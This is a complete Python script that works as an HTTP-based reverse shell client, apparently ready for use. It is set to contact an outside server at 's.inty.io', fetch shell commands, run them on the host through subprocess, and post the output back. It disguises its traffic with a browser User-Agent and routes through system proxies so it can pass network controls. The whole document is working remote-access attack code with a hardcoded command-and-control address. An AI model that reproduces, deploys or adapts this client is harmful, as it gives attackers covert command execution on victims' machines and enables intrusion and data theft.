#!/usr/bin/env python3
import requests
import subprocess
import time
import sys
import os
import urllib.parse
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

class ReverseShellClient:
    def __init__(self, server_url, poll_interval=2):
        self.server_url = server_url.rstrip('/')
        self.poll_interval = poll_interval
        self.session = self.create_session()
    
    def create_session(self):
        """Create a session that respects system proxy settings"""
        session = requests.Session()
        
        # Use system proxy settings (Windows will auto-detect)
        session.trust_env = True
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        
        adapter = HTTPAdapter(max_retries=retry_strategy)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Set a realistic User-Agent
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
        })
        
        return session
    
    def execute_command(self, command):
        """Execute a command and return the output"""
        try:
            # Execute command
            if command.lower().startswith('cd '):
                # Handle directory change
                new_dir = command[3:].strip()
                os.chdir(new_dir)
                return f"Changed directory to: {os.getcwd()}"
            
            # Execute other commands
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE,
                text=True,
                errors='replace'
            )
            
            # Get output with timeout
            stdout, stderr = process.communicate(timeout=30)
            
            # Combine stdout and stderr
            output = ""
            if stdout:
                output += stdout
            if stderr:
                output += stderr
            
            if not output:
                output = f"Command executed (exit code: {process.returncode})"
            
            return output
            
        except subprocess.TimeoutExpired:
            process.kill()
            return "Command timed out after 30 seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def get_command(self):
        """Poll the server for a new command"""
        try:
            response = self.session.get(
                f"{self.server_url}/get_command",
                timeout=10
            )
            
            if response.status_code == 200:
                return response.text.strip()
            elif response.status_code == 204:
                return None
            else:
                print(f"[!] Unexpected status code: {response.status_code}")
                return None
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error fetching command: {e}")
            return None
    
    def send_response(self, output):
        """Send command output back to the server"""
        try:
            # Use POST to send the response
            response = self.session.post(
                f"{self.server_url}/send_response",
                data=output.encode('utf-8'),
                headers={'Content-Type': 'text/plain'},
                timeout=10
            )
            
            if response.status_code != 200:
                print(f"[!] Failed to send response: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error sending response: {e}")
    
    def send_heartbeat(self):
        """Send heartbeat to server"""
        try:
            response = self.session.get(
                f"{self.server_url}/heartbeat",
                timeout=5
            )
            return response.status_code == 200
        except:
            return False
    
    def run(self):
        """Main client loop"""
        print(f"[*] Starting reverse shell client")
        print(f"[*] Server: {self.server_url}")
        print(f"[*] Poll interval: {self.poll_interval} seconds")
        print(f"[*] Using system proxy settings")
        
        # Test proxy configuration
        try:
            proxies = self.session.proxies
            if proxies:
                print(f"[*] Proxy detected: {proxies}")
            else:
                print("[*] No proxy detected")
        except:
            pass
        
        while True:
            try:
                # Check for new commands
                command = self.get_command()
                
                if command:
                    print(f"[+] Received command: {command}")
                    
                    # Execute the command
                    output = self.execute_command(command)
                    
                    # Send the response
                    self.send_response(output)
                
                # Send heartbeat periodically
                if int(time.time()) % 60 < self.poll_interval:
                    self.send_heartbeat()
                
                # Wait before next poll
                time.sleep(self.poll_interval)
                
            except KeyboardInterrupt:
                print("\n[*] Stopping client...")
                break
            except Exception as e:
                print(f"[!] Error in main loop: {e}")
                time.sleep(self.poll_interval * 2)  # Back off on error

if __name__ == "__main__":
    # Configuration
    SERVER_URL = "http://s.inty.io"  # Change this to your server's IP
    POLL_INTERVAL = 5  # Seconds between polls
    
    if SERVER_URL == "http://your-server-ip:8080":
        print("[!] Please configure the SERVER_URL with your server's IP address")
        sys.exit(1)
    
    client = ReverseShellClient(SERVER_URL, POLL_INTERVAL)
    client.run()
